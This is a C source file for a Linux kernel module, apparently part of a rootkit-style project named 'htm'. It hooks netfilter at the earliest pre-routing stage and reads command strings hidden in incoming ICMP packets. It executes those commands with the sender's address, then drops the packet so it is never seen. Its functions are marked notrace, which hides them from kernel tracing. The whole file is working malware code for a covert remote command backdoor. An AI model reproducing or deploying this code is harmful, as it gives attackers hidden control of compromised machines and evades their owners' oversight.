#include <linux/ip.h>
#include <linux/kmod.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/version.h>

#include "command.h"
#include "config.h"
#include "htm.h"
#include "netfilter.h"

static bool _enabled = false;
static struct nf_hook_ops _netfilter_hook_ops;

static __be32 _command_source_ip = 0;
static char _command_string[HTM_MAX_STRING];

static notrace unsigned int _htm_netfilter_hook(
	const struct nf_hook_ops *ops,
	struct sk_buff *skb, const struct net_device *in,
	const struct net_device *out, int (*okfn)(struct sk_buff *)
)
{
	char *data = NULL;
	struct iphdr *iph;

	if (! skb || ! (iph = ip_hdr(skb)) || ! iph->protocol)
		return NF_ACCEPT;

	if (iph->protocol == IPPROTO_ICMP) {
		if (! (data = (char *)((unsigned char *)iph + 28)))
			return NF_ACCEPT;

		if (! is_htm_command((char *)data))
			return NF_ACCEPT;

		if (! is_htm_command_atomic((char *)data)) {
			#ifdef HTM_DEBUG
			htm_pr_warn("%s cannot be executed from this context", (char *)data);
			#endif

			return NET_RX_DROP;
		}

		_command_source_ip = iph->saddr;
		strncpy(_command_string, (char *)data, HTM_MAX_STRING);
		_command_string[HTM_MAX_STRING - 1] = 0x00;

		htm_command(_command_string, &_command_source_ip);

		iph->saddr ^= 0x10000000;
		return NET_RX_DROP;
	}

	return NF_ACCEPT;
}

notrace int htm_netfilter_register(void)
{
	if (_enabled) {
		#ifdef HTM_DEBUG
		htm_pr_warn("netfilter hook already registered");
		#endif

		return -EINVAL;
	}

	_netfilter_hook_ops.pf = PF_INET;
	_netfilter_hook_ops.priority = NF_IP_PRI_FIRST;
	_netfilter_hook_ops.hooknum = NF_INET_PRE_ROUTING;

	_netfilter_hook_ops.hook = (void *)_htm_netfilter_hook;

	#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 13, 0)
	nf_register_hook(&_netfilter_hook_ops);
	#else
	nf_register_net_hook(&init_net, &_netfilter_hook_ops);
	#endif

	#ifdef HTM_DEBUG
	htm_pr_notice("netfilter hook registered");
	#endif

	_enabled = 1;

	return 0;
}

notrace int htm_netfilter_unregister(void)
{
	if (! _enabled) {
		#ifdef HTM_DEBUG
		htm_pr_warn("netfilter hook not registered");
		#endif

		return -EINVAL;
	}

	#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 13, 0)
	nf_unregister_hook(&_netfilter_hook_ops);
	#else
	nf_unregister_net_hook(&init_net, &_netfilter_hook_ops);
	#endif

	#ifdef HTM_DEBUG
	htm_pr_notice("netfilter hook unregistered");
	#endif

	_enabled = 0;

	return 0;
}
